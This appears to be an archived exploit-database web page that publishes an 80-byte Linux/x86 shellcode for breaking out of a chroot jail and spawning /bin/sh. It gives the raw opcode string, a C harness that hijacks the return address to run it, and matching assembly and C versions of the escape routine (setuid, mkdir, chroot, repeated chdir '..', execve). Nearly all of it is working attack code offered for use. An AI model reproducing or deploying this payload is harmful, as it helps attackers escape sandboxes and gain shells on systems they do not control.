<html><head><title>Linux/x86 - break chroot execve /bin/sh - 80 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* This is Linux chroot()/execve() code.It is 80 bytes long.I have some    *
 * ideas how to make it smaller, but till then use this one.               *
 *                                         signed predator                 *
 *                                         linux registered user : 181116  *
 *                                         preedator(at)sendmail(dot)ru    *
 ***************************************************************************/

char sc[]=&quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a&quot;
          &quot;\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83&quot;
          &quot;\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31&quot;
          &quot;\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b&quot;
          &quot;\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..&quot;;

int main(){
  int *ret=(int *)(&amp;ret+2);
  printf(&quot;len : %d\n&quot;,strlen(sc));
  *ret=(int)sc;
}


// Asm code
/*********************************************
 *int main(){                                *
 * __asm__(&quot; xorl %eax,%eax           \n&quot;    *
 *	   &quot; xorl %ebx,%ebx           \n&quot;    *
 *         &quot; xorl %ecx,%ecx           \n&quot;    *
 *	   &quot; movb $0x17,%al           \n&quot;    *
 *	   &quot; int  $0x80               \n&quot;    *
 *         &quot; jmp 0x36                 \n&quot;    *
 *         &quot; popl %esi                \n&quot;    *
 *	   &quot; movb %al,0xa(%esi)       \n&quot;    *
 *         &quot; leal 0x5(%esi),%ebx      \n&quot;    *
 *	   &quot; movb $0xed,%cl           \n&quot;    *
 *	   &quot; movb $0x27,%al           \n&quot;    *
 *	   &quot; int $0x80                \n&quot;    *
 *         &quot; xorl %eax,%eax           \n&quot;    *
 *         &quot; movb $0x3d,%al           \n&quot;    *
 *	   &quot; int $0x80                \n&quot;    * 
 *	   &quot; addl $0x2,%ebx           \n&quot;    *
 *         &quot; movb $0xc,%al            \n&quot;    *
 *	   &quot; int $0x80                \n&quot;    *
 *         &quot; loopne -0x06             \n&quot;    *
 *         &quot; movb $0x3d,%al           \n&quot;    *
 *	   &quot; int $0x80                \n&quot;    *
 *	   &quot; movl %esi,0x8(%esi)      \n&quot;    * 
 *         &quot; xorl %eax,%eax           \n&quot;    * 
 *         &quot; movb %al,0x7(%esi)       \n&quot;    *
 *         &quot; movl %eax,0xc(%esi)      \n&quot;    *
 *         &quot; movl %esi,%ebx           \n&quot;    *
 *         &quot; leal 0x8(%esi),%ecx      \n&quot;    *
 *         &quot; movl %eax,%edx           \n&quot;    *
 *         &quot; movb $0xb,%al            \n&quot;    *
 *         &quot; int $0x80                \n&quot;    *
 *         &quot; call -0x3b               \n&quot;    *
 *         &quot; .string \&quot;/bin/sh..\&quot;    \n&quot;);  *
 *}                                          *
 *********************************************/ 

//C code
/**********************************************
*int main(){                                  *
*  char *sh[2]={&quot;/bin/sh&quot;,NULL};              *
*  int gg=0xed                                *
*  mkdir(&quot;sh..&quot;,gg);			      *
*  chroot(&quot;sh..&quot;);			      *
*  while (gg!=0){                             *
*     chdir(&quot;..&quot;);gg--;                       *
*  }                                          *
* chroot(&quot;..&quot;);                               *
* execve(sh[0],sh,NULL);                      *
*}                                            *
***********************************************/


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
